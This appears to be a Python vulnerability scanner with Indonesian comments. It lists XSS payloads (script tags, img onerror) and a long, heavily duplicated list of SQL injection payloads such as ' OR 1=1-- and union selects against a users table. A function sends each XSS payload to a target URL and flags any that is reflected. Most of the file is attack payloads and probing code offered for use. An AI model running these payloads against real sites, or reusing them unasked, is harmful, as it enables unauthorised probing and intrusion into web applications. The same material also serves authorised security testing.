import requests
from bs4 import BeautifulSoup

# Mendefinisikan payload umum untuk serangan XSS (Cross-Site Scripting) dan SQL Injection
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='https://www.shutterstock.com/image-vector/attention-danger-symbol-on-dark-260nw-2204728543.jpg' onerror=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "\"><img src='https://www.shutterstock.com/image-vector/attention-danger-symbol-on-dark-260nw-2204728543.jpg' onerror=alert('XSS')>",
    "'><img src='https://www.shutterstock.com/image-vector/attention-danger-symbol-on-dark-260nw-2204728543.jpg' onerror=alert('XSS')>"
]

sql_payloads = [
    "' OR 1=1--",
    "' OR 1=1-- -",
    "' OR 1=1#",
    "' OR '1'='1'--",
    "' OR '1'='1'-- -",
    "' OR '1'='1'#",
    "\" OR 1=1--",
    "\" OR 1=1-- -",
    "\" OR 1=1#",
    "') OR 1=1--",
    "') OR 1=1-- -",
    "') OR 1=1#",
    "'; OR 1=1--",
    "'; OR 1=1-- -",
    "'; OR 1=1#",
    "admin or 1=1--",
    "admin or 1=1-- -",
    "admin or 1=1#",
    "' OR 'x'='x",
    "\" OR \"x\"=\"x",
    "') OR ('x'='x",
    "\")) OR (('x\"=\"x",
    "')) OR ((\"x\"=\"x",
    "' or 1=1--",
    "\" or 1=1--",
    "') or 1=1--",
    "\") or 1=1--",
    "' or '1'='1",
    "\" or \"1\"=\"1",
    "') or ('1'='1",
    "\") or (\"1\"=\"1",
    "' or a=a--",
    "\" or a=a--",
    "') or a=a--",
    "\") or a=a--",
    "' or username like '%",
    "\" or username like '%",
    "') or username like '%",
    "\") or username like '%",
    "' or 'x'='x",
    "\" or \"x\"=\"x",
    "') or ('x'='x",
    "\") or (\"x\"=\"x",
    "' or 1=1--",
    "\" or 1=1--",
    "') or 1=1--",
    "\") or 1=1--",
    "' or a=a--",
    "\" or a=a--",
    "') or a=a--",
    "\") or a=a--",
    "' union select null--",
    "\" union select null--",
    "') union select null--",
    "\") union select null--",
    "' union select * from users--",
    "\" union select * from users--",
    "') union select * from users--",
    "\") union select * from users--",
    "' or 1=1--",
    "\" or 1=1--",
    "') or 1=1--",
    "\") or 1=1--",
    "' or a=a--",
    "\" or a=a--",
    "') or a=a--",
    "\") or a=a--",
    "' union select null--",
    "\" union select null--",
    "') union select null--",
    "\") union select null--",
    "' union select * from users--",
    "\" union select * from users--",
    "') union select * from users--",
    "\") union select * from users--"
]

# Fungsi untuk menguji kerentanan XSS
def test_xss(url):
    print(f"Menguji {url} untuk kerentanan XSS...")
    for payload in xss_payloads:
        # Mengirimkan permintaan dengan payload XSS
        response = requests.get(url, params={'input': payload})
        # Memeriksa apakah payload tercermin dalam respons
        if payload in response.text:
            print(f"Potensi kerentanan XSS terdeteksi dengan payload: {payload}")
            return True
    print("Tidak ada kerentanan XSS yang terdeteksi.")
    return False